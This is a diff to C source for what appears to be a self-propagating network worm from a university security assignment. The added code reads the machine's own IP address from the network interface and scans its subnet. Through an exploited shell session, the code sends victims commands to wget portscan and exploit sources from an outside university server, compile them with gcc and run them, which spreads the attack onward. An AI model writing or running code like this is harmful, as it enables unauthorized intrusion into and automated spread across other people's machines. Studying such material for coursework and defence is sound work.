@@ -24,11 +24,22 @@
 
 #include <poll.h>
 
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+
 #define IP_LENGTH 15
 #define BUFFER_SIZE 256
 
+#if defined(__APPLE__)
+# define NETWORK_INTERFACE "en0"
+#else
+# define NETWORK_INTERFACE "eth0"
+#endif
+
 void cshell (int sock);
 int exploiter(int argc, char *argv[]);
+char *showips();
 
 int main(int argc, char *argv[]) {
  
@@ -51,17 +62,21 @@ int main(int argc, char *argv[]) {
     char *token;
     int ipaddr;
     char *ips;
+    char *own_ip;
 
-    ip = malloc(IP_LENGTH*sizeof(char));
+    // own_ip = malloc(IP_LENGTH*sizeof(char));
 
-    // ip = showips();
-    strcpy(ip, "192.168.1.110");
+    own_ip = showips();
+    // printf("%s\n", ip);
+    // return(0);
+
+    // strcpy(ip, "192.168.1.110");
 
     // Isolate subnet from IP
     i = 0;
     subnet = malloc(IP_LENGTH*sizeof(char));
     subnet[0] = '\0';
-    while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
+    while (((token = strsep(&own_ip, ".")) != NULL) && i<3 ) {        
         strcat(subnet, token);
         strcat(subnet, ".");
         i++;
@@ -70,6 +85,8 @@ int main(int argc, char *argv[]) {
     ip = malloc(IP_LENGTH*sizeof(char));
     ips = malloc(3*sizeof(char));
     for (ipaddr=110; ipaddr<=254; ipaddr++) {
+
+        // compare ip with own_ip
 
         strcpy(ip, subnet);
         sprintf(ips, "%d", ipaddr);
@@ -248,19 +265,26 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[5] = {   
+        char *commands[7] = {   
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
-                                "make\n",
+                                "gcc -c exploit.c\n",
+                                "gcc -c portscan.c\n",
+                                "gcc -o portscan portscan.o exploit.o\n",
+                                // "make\n",
                                 "./portscan\n"
         }; //, "gcc portscan.c -o portscan", "./portscan"};
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
         int i;
-        for(i=0; i<5; i++) {
+        for(i=0; i<7; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
+            sleep(3);
+            if(i == 2) {
+                sleep(10);
+            }
         }
         
 
@@ -303,6 +327,28 @@ void cshell (int sock) {
         //         write (1, buf, l);
         //     }
         // }
+}
+
+char *showips() {
+    int fd;
+    struct ifreq ifr;
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+    /* I want to get an IPv4 IP address */
+    ifr.ifr_addr.sa_family = AF_INET;
+
+    /* I want IP address attached to "eth0" */
+    strncpy(ifr.ifr_name, NETWORK_INTERFACE, IFNAMSIZ-1);
+
+    ioctl(fd, SIOCGIFADDR, &ifr);
+
+    close(fd);
+
+    /* display result */
+    // printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+
+    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
 }
 
 // char *showips() {
